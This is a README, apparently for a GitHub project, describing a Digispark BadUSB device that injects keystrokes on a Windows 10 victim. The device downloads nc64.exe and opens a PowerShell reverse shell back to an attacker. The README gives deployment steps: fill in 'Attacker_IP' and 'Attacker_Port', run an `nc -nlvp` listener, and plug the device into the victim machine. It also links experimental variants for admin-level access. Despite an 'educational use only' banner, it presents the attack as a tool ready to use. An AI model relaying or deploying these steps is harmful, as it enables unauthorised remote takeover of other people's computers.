**EDUCATIONAL USE ONLY, USE AT YOUR OWN RISK!**
# Digispark - Reverse shell, Windows 10
For more details, see our documentations: []()

Opens up Run in Windows.    
Using keystroke injections, downloads `nc64.exe` from:    
https://github.com/int0x33/nc.exe

Calls the attacker, using downloaded `nc64.exe` and opens up a powershell access from attacker.
## How to use:

*Designed, using Finnish keyboard in victim machine.*     
- Check [DigiKeyboardFi](https://github.com/therealhalonen/DigiKeyboardFi) for support it.    
- Download the .ino, or copy the code.    
- Open the file or paste the content to/in Arduino IDE.
- Define:
	-  `-ArgumentList \'Attacker_IP\', \'Attacker_Port\',`
- Upload to Digispark
- Establish the listener to attacker machine:
	- `nc -nlvp PORT`

- Plug in to victim machine
- **PROFIT!**
---
**Note:**   
Folders:   
- [experimental](https://github.com/therealhalonen/PhishSticks/tree/master/digispark/digispark_revshell/experimental)
	- Contains experimental stuff, to open up the Powershell from victim as Admin user for attacker to get "instant roots"
- [old](https://github.com/therealhalonen/PhishSticks/tree/master/digispark/digispark_revshell/old) 
	- One of the first drafts to initially getting the reverse shell to work